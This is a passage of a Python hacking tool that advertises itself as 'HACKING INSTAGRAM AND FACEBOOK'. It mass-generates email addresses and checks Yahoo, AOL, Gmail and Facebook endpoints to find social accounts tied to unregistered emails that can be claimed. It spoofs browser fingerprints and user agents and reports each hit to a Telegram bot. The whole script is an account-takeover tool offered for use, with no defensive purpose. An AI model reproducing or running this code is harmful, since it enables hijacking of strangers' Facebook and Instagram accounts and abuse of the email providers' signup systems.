		ata = {'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":-180,"timezone":"Asia/Baghdad","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~Google SwiftShader","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1627553991633,"render":1627553997166}}',
    'specId': 'yidreg',
    'crumb': 'rak/FdAmWa5',
    'acrumb': '9z9sgq95',
    'done': 'https://www.yahoo.com',
    'attrSetIndex': '0',
    'tos0': 'oath_freereg|xa|ar-JO',
    'yid': str(Email.split('@')[0]),
    'password': 'basha07',
    'shortCountryCode': 'AF',}
		eq = post("https://login.yahoo.com/account/module/create?validateField=yid'",headers=rd,data=ata).text
		if ('"yid"') in eq:
				print(Z+f"NOT AVAILABLE IN YAHOO => {Email} ")
				
		else:
				print(X+f"AVAILABLE IN YAHOO => {Email} ")
				alaa.fce(Email)
	def aoll(e):
		took=str(Token)
		iidd = str(IDd)
		email = str(e)
		check = gdolib.check_email.aol(email)
		if check['status']=='Success':
			print(X+f"AVAILABLE IN AOL => {email} ")
			alaa.fce(email)
		else:
			print(Z+f"NOT AVAILABLE IN AOL => {email} ")
	def fce(Email):
		took=str(Token)
		iidd=str(IDd)
		emal=str(Email)
		try:
			br = mechanize.Browser()
			br.set_handle_robots(False)
			br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
			br.head = [('User-agent',choice(['Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:48.0) Gecko/20100101 Firefox/48.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2667.96 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0','Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2954.87 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:49.0) Gecko/20100101 Firefox/49.0','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2645.88 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2823.75 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:50.0) Gecko/20100101 Firefox/50.0','Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0','Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2884.13 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2644.90 Safari/537.36']))]
			br.open("https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0&ars=facebook_login&alternate_search=0&toggle_search_mode=1")
			br._factory.is_html= True
			br.select_form(nr=0)
			br.form["email"] = Email
			br.submit()
			urb = br.geturl()
			if "https://mbasic.facebook.com/login/device-based/ar/login/?ldat" in urb:
					print(F+f"AVAILABLE IN FACEBOOK => {Email} ")
					post(f'''https://api.telegram.org/bot{took}/sendMessage?chat_id={iidd}&text=NEW AVAILABLE FACEBOOK :
Email :- {Email}
Dev :- @M_L_F''')
			elif "https://mbasic.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0" in urb:
				check = gdolib.check_email.facebook(Email)
				if check['status']=='Success':
					print(F+f"AVAILABLE IN FACEBOOK => {Email} ")
					post(f'''https://api.telegram.org/bot{took}/sendMessage?chat_id={iidd}&text=NEW AVAILABLE FACEBOOK :
Email :- {Email}
Dev :- @M_L_F''')
				else:
					print(C+f"NOT AVAILABLE IN FACEBOOK => {Email} ")
					
					
			else:
				print(C+f"NOT AVAILABLE IN FACEBOOK => {Email} ")
		except:
			alaa.fce(Email)
def jalan(z):
    for e in z + '\n':
    	sys.stdout.write(e)
    	sys.stdout.flush()
    	sleep(0.03)
jalan(Z+f'''HACKING {F}INSTAGRAM {A}AND {F}FACEBOOK {Z}•''')
sleep(1)
system('clear')
print(Z+f'''HACKING {F}INSTAGRAM {A}AND {F}FACEBOOK {Z}• {C}•''')
sleep(2)
system('clear')
print(Z+f'''HACKING {F}INSTAGRAM {A}AND {F}FACEBOOK {Z}• {C}• {X}•''')
sleep(2)
system('clear')
print(Z+f'''HACKING {F}INSTAGRAM {A}AND {F}FACEBOOK {Z}• {C}• {X}• {F}• DONE {C}- {F}RUNING √''')
sleep(2)
print(C+'-'*50)
M = C+'-'*50
def y():
	o = F+"-"*58
	t = Z+"-"*58
	bk = input(f"{o}\n    {Z}√ {F}    INSTAGRAM      {Z}√     \n{o}\n{Z}({F}1{Z}) {B}Extract {Z}following {B}from a specific user {X}•\n{Z}({F}2{Z}) {B}Hack Available {Z}Gmail {B}From Combo {X}•\n{Z}({F}3{Z}) {Z}Delet Combo {X}•\n{Z}({F}4{Z}) {B}Login up for a Sessionid {X}•\n{Z}({F}5{Z}) {B}Extract {Z}followers {B}from a specific user {X}•\n{Z}({F}6{Z}) {Z}Search {B}For UserNames {X}• \n{Z}({F}7{Z}) {B}Hack Available {Z}Aol {B}And {Z}Gmail {B}Auto {X}•\n{Z}({F}8{Z}) {B}Hack Available {Z}Gmail {B}Auto {X}•\n{C}-----------------\n{B}[{A}={B}] {B}Choose :- {Z}")
	print(F+"•"*60)

	if bk == '1':
		print("COMMING SooN...")
		exit()
		try:
			SIS= input(B+"Enter Your Sessionid => "+X)
			use = input(B+"Enter User => "+X)
			alaa.ser(SIS,use)
		except requests.exceptions.ConnectionError:
			print(A+f"The network is not working, waiting {X}•")
			sleep(3)
			system('clear')
		y()
	if bk == '2':
		system('clear')
		Fil = input(B+f"Enter Name Combo {F}' k ' {B}or any Combo => {Z}")
		print(C+"="*58)
		try:
			use = open(f"{Fil}.txt","r").read().splitlines()
			pass
		except:
			print(Z+"FILE NOT FOUND !")
			sleep(3)
			system('clear')
			y()
		for us in use:
				u = us.split('@')[0]
				try:
					emai = u+"@gmail.com"
					alaa.insta(us,emai)
				except:
					sleep(3)
					alaa.insta(us,emai)	
		system('clear')
		y()
			
	if bk == '3':
		system("rm -rf k.txt")
		print("Done Delet Combo !")
		sleep(2)
		system('clear')
		y()
	if bk == '4':
		try:
			alaa.login()
		except requests.exceptions.ConnectionError:
			print(A+f"The network is not working {X}•")
			sleep(3)
			system('clear')
			y()
	if bk == '5':
		print("COMMING SooN....")
		exit()
		try:
			SIS= input(B+"Enter Your Sessionid => "+X)
			use = input(B+"Enter User => "+X)
			alaa.se(SIS,use)
		except:
			print(A+f"The network is not working, waiting {X}•")
			sleep(3)
			system('clear')
		y()
	if bk == '6':
		try:
			for i in range(300):
				alaa.search()
			sleep(2)
			system('clear')
			y()
		except:
			print("ERORR")
	if bk == '7':
		while True:
			try:
				hd = {
'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
'access-control-request-headers':'x-asbd-id,x-csrftoken,x-ig-app-id,x-ig-www-claim,x-instagram-ajax',
'access-control-request-method':'GET',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-site',
'user-agent':str(generate_user_agent())}
				u = str(randint(1,7))
				s = str(''.join(choice('1234567890') for i in range(int(u))))
				e = str(choice([get_first_name(),get_full_name().replace(' ',''),get_last_name()]))+s
				XC = str(choice('asdfghjklmnbvcxzqwertyuiop1234567890') for i in range(int(u)))+s
				eer =str(choice([e,XC]))
				req = get(f"https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={eer}&rank_token=0.6481600571666157&include_reel=true",headers=hd).json()['users']
				for i in req:
					alaa.insta(i['user']['username'],i['user']['username']+"@gmail.com")
					alaa.i(i['user']['username'],i['user']['username']+"@aol.com")
			except:
				print(A+f"The network is not working, waiting {X}•")
				sleep(3)
				system('clear')
				y()
				
		system('clear')
		y()
	if bk =='8':
		while True:
			try:
				hd = {
'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
'access-control-request-headers':'x-asbd-id,x-csrftoken,x-ig-app-id,x-ig-www-claim,x-instagram-ajax',
'access-control-request-method':'GET',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-site',
'user-agent':str(generate_user_agent())}
				u = str(randint(1,7))
				s = str(''.join(choice('1234567890') for i in range(int(u))))
				e = str(choice([get_first_name(),get_full_name().replace(' ',''),get_last_name()]))+s
				XC = str(choice('asdfghjklmnbvcxzqwertyuiop1234567890') for i in range(int(u)))+s
				eer =str(choice([e,XC]))
				req = get(f"https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={eer}&rank_token=0.6481600571666157&include_reel=true",headers=hd).json()['users']
				for i in req:
					alaa.insta(i['user']['username'],i['user']['username']+"@gmail.com")
			except:
				print(A+f"The network is not working, waiting {X}•")
				sleep(3)
				system('clear')
				y()
def yy():
	o = F+"-"*58
	t = Z+"-"*58
	bk = input(f"{o}\n    {Z}√ {F}    FACEBOOK      {Z}√     \n{o}\n{Z}({F}1{Z}){B} Check Auto {Z}FaceBook {B}Available {Z}Yahoo {X}•\n{Z}({F}2{Z}) {B}Check {Z}FaceBook From Name {B}Available {Z}Yahoo {X}•\n{Z}({F}3{Z}){B} Check Auto {Z}FaceBook {B}Available {Z}Gmail {X}•\n{Z}({F}4{Z}) {B}Check {Z}FaceBook From Name {B}Available {Z}Gmail {X}•\n{Z}({F}5{Z}){B} Check Auto {Z}FaceBook {B}Available {Z}Aol {X}•\n{Z}({F}6{Z}) {B}Check {Z}FaceBook From Name {B}Available {Z}Aol {X}•{B}\n{t}\n{B}[{A}={B}] {B}Choose :- {Z}")
	if bk == '1':
		system('clear')
		while True:
			try:
				u = str(randint(1,7))
				s = str(''.join(choice('1234567890') for i in range(int(u))))
				e = str(''.join(choice([get_first_name(),get_last_name(),get_full_name().replace(' ','')])))+s+"@yahoo.com"
				alaa.yah(e)
			except requests.exceptions.ConnectionError:
				print(A+f"The network is not working, waiting {X}•")
	if bk == '2':
		nam = input(B+f"Enter a Name To Guess {B}:- {Z}")
		system('clear')
		while True:
				try:
					u = str(randint(1,7))
					s = str(''.join(choice('1234567890') for i in range(int(u))))
					e = nam+s+"@yahoo.com"
					alaa.yah(e)
				except:print(A+f"The network is not working, waiting {X}•")
	if bk == '3':
		system('clear')
		while True:
			try:
				u = str(randint(1,10))
				s = str(''.join(choice('1234567890') for i in range(int(u))))
				e = str(''.join(choice([get_first_name(),get_last_name(),get_full_name().replace(' ','')])))+s+"@gmail.com"
				alaa.f_am(e)
			except requests.exceptions.ConnectionError:
				print(A+f"The network is not working, waiting {X}•")
		
	if bk == '4':
		nam = input(B+f"Enter a Name To Guess {B}:- {Z}")
		system('clear')
		while True:
			try:
				u = str(randint(1,7))
				s = str(''.join(choice('1234567890') for i in range(int(u))))
				e = nam+s+"@gmail.com"
				alaa.f_am(e)
			except requests.exceptions.ConnectionError:
				print(A+f"The network is not working, waiting {X}•")
	if bk == '5':
		system('clear')
		while True:
			try:
				u = str(randint(1,10))
				s = str(''.join(choice('1234567890') for i in range(int(u))))
				e = str(''.join(choice([get_first_name(),get_last_name(),get_full_name().replace(' ','')])))+s+"@aol.com"
				alaa.aoll(e)
			except requests.exceptions.ConnectionError:
				print(A+f"The network is not working, waiting {X}•")
	
	if bk == '5':
		nam = input(f"Enter a Name To Guess {B}:- {Z}")
		system('clear')
		while True:
			try:
				u = str(randint(1,7))
				s = str(''.join(choice('1234567890') for i in range(4)))
				e = nam+s+"@aol.com"
				alaa.aoll(e)
			except requests.exceptions.ConnectionError:
				print(A+f"The network is not working, waiting {X}•")
def HACK():
	BK = input(f"WHAT DO YOU WANT TO {Z}HACK ? \n{F}[{Z}1{F}] {F}INSTAGRAM {C}•\n{F}[{Z}2{F}] {F}FACEBOOK {C}•\n{F}[{Z}3{F}] MY ACCOUNT TELLEGTAM {C}•\n{F}*{M}{F}*\n{F}°{B}_{F}° {C}CHOOSE BRO : {Z}")
	if BK == '1':
		system('clear')
		y()
	if BK == '2':
		system('clear')
		yy()
	if BK == '3':
		webbrowser.open('https://t.me/M_L_F')
		sleep(1)
		system('clear')
		HACK()
	else:
		system('clear')
		HACK()
HACK( )

	
